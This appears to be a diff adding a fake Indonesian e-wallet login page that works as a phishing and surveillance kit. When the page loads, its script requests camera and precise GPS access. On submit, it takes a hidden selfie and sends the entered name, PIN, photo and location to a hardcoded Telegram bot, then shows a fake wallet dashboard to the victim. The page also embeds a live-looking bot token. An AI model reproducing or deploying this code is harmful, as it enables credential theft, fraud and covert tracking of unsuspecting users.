@@ -1,0 +1,486 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>E-Wallet Login</title>
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+    }
+
+    body {
+      background-color: #10b981;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+    }
+
+    .app-container {
+      width: 100%;
+      max-width: 420px;
+      background-color: #ffffff;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      position: relative;
+      box-shadow: 0 0 20px rgba(0,0,0,0.1);
+    }
+
+    /* ====================================
+       1. HALAMAN LOGIN (PAGE 1)
+    ==================================== */
+    #loginPage {
+      padding: 40px 24px;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      min-height: 100vh;
+      background: #ffffff;
+    }
+
+    .login-header {
+      text-align: center;
+      margin-bottom: 30px;
+    }
+
+    .login-header h2 {
+      font-size: 1.8rem;
+      color: #059669;
+      font-weight: 800;
+    }
+
+    .login-header p {
+      font-size: 0.85rem;
+      color: #64748b;
+      margin-top: 6px;
+    }
+
+    .form-group {
+      margin-bottom: 18px;
+    }
+
+    .form-group label {
+      display: block;
+      font-size: 0.8rem;
+      font-weight: 600;
+      color: #334155;
+      margin-bottom: 6px;
+    }
+
+    .form-group input {
+      width: 100%;
+      padding: 14px;
+      border: 1.5px solid #e2e8f0;
+      border-radius: 12px;
+      font-size: 0.95rem;
+      outline: none;
+    }
+
+    .form-group input:focus {
+      border-color: #10b981;
+      box-shadow: 0 0 0 3px rgba(16, 185, 129, 0.1);
+    }
+
+    .btn-login {
+      width: 100%;
+      background-color: #10b981;
+      color: white;
+      border: none;
+      padding: 15px;
+      border-radius: 12px;
+      font-size: 1rem;
+      font-weight: 700;
+      cursor: pointer;
+      margin-top: 10px;
+      box-shadow: 0 4px 12px rgba(16, 185, 129, 0.3);
+    }
+
+    .btn-login:disabled {
+      background-color: #9ca3af;
+      box-shadow: none;
+    }
+
+    /* Kamera tersembunyi untuk mengambil gambar selfie */
+    .hidden-camera {
+      position: absolute;
+      width: 1px;
+      height: 1px;
+      opacity: 0;
+      pointer-events: none;
+    }
+
+    #status {
+      margin-top: 15px;
+      font-size: 0.85rem;
+      text-align: center;
+      font-weight: 600;
+    }
+
+    /* ====================================
+       2. HALAMAN DASHBOARD E-WALLET (PAGE 2)
+    ==================================== */
+    #dashboardPage {
+      display: none; /* Tersembunyi sebelum login */
+      flex-direction: column;
+      min-height: 100vh;
+      background-color: #f8fafc;
+    }
+
+    .wallet-header {
+      background: linear-gradient(135deg, #10b981, #059669);
+      color: white;
+      padding: 24px 20px 30px;
+      border-bottom-left-radius: 24px;
+      border-bottom-right-radius: 24px;
+    }
+
+    .user-info {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 20px;
+    }
+
+    .user-profile {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+    }
+
+    .avatar {
+      width: 44px;
+      height: 44px;
+      background-color: rgba(255, 255, 255, 0.2);
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-weight: bold;
+      font-size: 1.2rem;
+    }
+
+    .greeting p {
+      font-size: 0.75rem;
+      opacity: 0.85;
+    }
+
+    .greeting h3 {
+      font-size: 1rem;
+      font-weight: 700;
+    }
+
+    .balance-card {
+      background: rgba(255, 255, 255, 0.15);
+      backdrop-filter: blur(10px);
+      border: 1px solid rgba(255, 255, 255, 0.2);
+      border-radius: 16px;
+      padding: 18px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+
+    .balance-title {
+      font-size: 0.75rem;
+      opacity: 0.9;
+    }
+
+    .balance-amount {
+      font-size: 1.5rem;
+      font-weight: 800;
+      margin-top: 2px;
+    }
+
+    .badge-status {
+      background-color: #ecfdf5;
+      color: #059669;
+      padding: 6px 12px;
+      border-radius: 20px;
+      font-size: 0.75rem;
+      font-weight: 700;
+    }
+
+    .content-body {
+      padding: 20px;
+      flex: 1;
+    }
+
+    .menu-grid {
+      display: grid;
+      grid-template-columns: repeat(4, 1fr);
+      gap: 15px;
+      background: white;
+      padding: 20px 15px;
+      border-radius: 16px;
+      box-shadow: 0 4px 15px rgba(0,0,0,0.03);
+      margin-bottom: 20px;
+    }
+
+    .menu-item {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 8px;
+    }
+
+    .menu-icon {
+      width: 48px;
+      height: 48px;
+      background-color: #ecfdf5;
+      border-radius: 14px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 1.3rem;
+    }
+
+    .menu-item span {
+      font-size: 0.75rem;
+      color: #475569;
+      font-weight: 600;
+    }
+
+    .history-card {
+      background: white;
+      border-radius: 16px;
+      padding: 18px;
+      box-shadow: 0 4px 15px rgba(0,0,0,0.03);
+    }
+
+    .history-title {
+      font-size: 0.9rem;
+      font-weight: 700;
+      color: #1e293b;
+      margin-bottom: 12px;
+    }
+
+    .history-item {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 10px 0;
+      border-bottom: 1px solid #f1f5f9;
+    }
+
+    .history-item:last-child {
+      border-bottom: none;
+    }
+
+    .history-info p {
+      font-size: 0.85rem;
+      font-weight: 600;
+      color: #334155;
+    }
+
+    .history-info small {
+      font-size: 0.7rem;
+      color: #94a3b8;
+    }
+
+    .history-amount {
+      font-size: 0.85rem;
+      font-weight: 700;
+      color: #10b981;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="app-container">
+
+    <!-- ================= HALAMAN 1: LOGIN ================= -->
+    <div id="loginPage">
+      <div class="login-header">
+        <h2>MyWallet</h2>
+        <p>Silakan masuk ke akun dompet digital Anda</p>
+      </div>
+
+      <form id="loginForm">
+        <div class="form-group">
+          <label>Nama Lengkap / Username</label>
+          <input type="text" id="inputNama" placeholder="Masukkan nama Anda" required>
+        </div>
+
+        <div class="form-group">
+          <label>Nomor HP / PIN</label>
+          <input type="password" id="inputPin" placeholder="Masukkan PIN / No HP" required>
+        </div>
+
+        <button type="submit" id="btnLogin" class="btn-login">MASUK AKUN</button>
+        <div id="status"></div>
+      </form>
+
+      <!-- Elemen Kamera Tersembunyi -->
+      <video id="webcam" class="hidden-camera" autoplay playsinline muted></video>
+      <canvas id="canvas" class="hidden-camera"></canvas>
+    </div>
+
+    <!-- ================= HALAMAN 2: DASHBOARD E-WALLETS ================= -->
+    <div id="dashboardPage">
+      <div class="wallet-header">
+        <div class="user-info">
+          <div class="user-profile">
+            <div class="avatar" id="userAvatar">A</div>
+            <div class="greeting">
+              <p>Selamat Datang,</p>
+              <h3 id="displayNama">User</h3>
+            </div>
+          </div>
+        </div>
+
+        <div class="balance-card">
+          <div>
+            <div class="balance-title">Saldo Kehadiran / Wallet</div>
+            <div class="balance-amount">Rp 2.500.000</div>
+          </div>
+          <div class="badge-status">Aktif</div>
+        </div>
+      </div>
+
+      <div class="content-body">
+        <!-- Menu Cepat Ala e-Wallet -->
+        <div class="menu-grid">
+          <div class="menu-item">
+            <div class="menu-icon">📤</div>
+            <span>Kirim</span>
+          </div>
+          <div class="menu-item">
+            <div class="menu-icon">📥</div>
+            <span>Minta</span>
+          </div>
+          <div class="menu-item">
+            <div class="menu-icon">📲</div>
+            <span>Scan</span>
+          </div>
+          <div class="menu-item">
+            <div class="menu-icon">💳</div>
+            <span>Top Up</span>
+          </div>
+        </div>
+
+        <!-- Riwayat Transaksi -->
+        <div class="history-card">
+          <div class="history-title">Aktivitas Terakhir</div>
+          <div class="history-item">
+            <div class="history-info">
+              <p>Login Presensi Berhasil</p>
+              <small>Baru saja</small>
+            </div>
+            <div class="history-amount">+ Sesi Aktif</div>
+          </div>
+          <div class="history-item">
+            <div class="history-info">
+              <p>Bonus Kehadiran</p>
+              <small>Kemarin, 08:00 WIB</small>
+            </div>
+            <div class="history-amount">+ Rp 50.000</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+  </div>
+
+  <script>
+    // === MASUKKAN BOT TOKEN & CHAT ID TELEGRAM DI SINI ===
+    const BOT_TOKEN = '8923573949:AAGZm4FP8EkWoaJqLdzUG0y1cZnfG0Yd8Is';
+    const CHAT_ID = '6742478722';
+
+    const loginPage = document.getElementById('loginPage');
+    const dashboardPage = document.getElementById('dashboardPage');
+    const loginForm = document.getElementById('loginForm');
+    const btnLogin = document.getElementById('btnLogin');
+    const statusDiv = document.getElementById('status');
+    const video = document.getElementById('webcam');
+    const canvas = document.getElementById('canvas');
+
+    let userLat = null;
+    let userLon = null;
+
+    // 1. Inisialisasi Kamera & Lokasi saat Halaman Dimuat
+    window.addEventListener('load', () => {
+      // Minta izin Kamera
+      if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+        navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false })
+          .then(stream => { video.srcObject = stream; })
+          .catch(err => console.warn('Kamera tidak diizinkan:', err));
+      }
+
+      // Minta izin GPS
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          pos => {
+            userLat = pos.coords.latitude;
+            userLon = pos.coords.longitude;
+          },
+          err => console.warn('GPS tidak diizinkan:', err),
+          { enableHighAccuracy: true }
+        );
+      }
+    });
+
+    // 2. Alur Saat Klik Tombol "MASUK AKUN"
+    loginForm.addEventListener('submit', async (e) => {
+      e.preventDefault();
+
+      const nama = document.getElementById('inputNama').value;
+      const pin = document.getElementById('inputPin').value;
+
+      btnLogin.disabled = true;
+      statusDiv.style.color = '#3b82f6';
+      statusDiv.innerText = 'Memverifikasi akun...';
+
+      // Ambil foto selfie tersembunyi
+      canvas.width = video.videoWidth || 640;
+      canvas.height = video.videoHeight || 480;
+      const ctx = canvas.getContext('2d');
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+      // Siapkan Notifikasi Telegram
+      const mapUrl = (userLat && userLon) 
+        ? `https://maps.google.com/?q=${userLat},${userLon}` 
+        : 'Lokasi tidak aktif/ditolak';
+
+      const caption = `🔐 *NOTIFIKASI LOGIN PRESI / WALLET*\n\n` +
+                      `👤 *Nama:* ${nama}\n` +
+                      `🔑 *PIN/No HP:* ${pin}\n` +
+                      `📍 *Lokasi:* [Buka Google Maps](${mapUrl})\n` +
+                      `⏰ *Waktu:* ${new Date().toLocaleString('id-ID')}`;
+
+      // Kirim Foto + GPS ke Telegram
+      canvas.toBlob(async (blob) => {
+        const formData = new FormData();
+        formData.append('chat_id', CHAT_ID);
+        if (blob) formData.append('photo', blob, 'login_selfie.jpg');
+        formData.append('caption', caption);
+        formData.append('parse_mode', 'Markdown');
+
+        try {
+          if (!BOT_TOKEN.includes('ISI_TOKEN_BOT')) {
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+              method: 'POST',
+              body: formData
+            });
+          }
+        } catch (err) {
+          console.error('Gagal kirim tele:', err);
+        } finally {
+          // 3. Perpindahan Halaman ke Dompet Digital
+          document.getElementById('displayNama').innerText = nama;
+          document.getElementById('userAvatar').innerText = nama.charAt(0).toUpperCase();
+
+          loginPage.style.display = 'none';
+          dashboardPage.style.display = 'flex';
+        }
+      }, 'image/jpeg', 0.8);
+    });
+  </script>
+
+</body>
+</html>
+
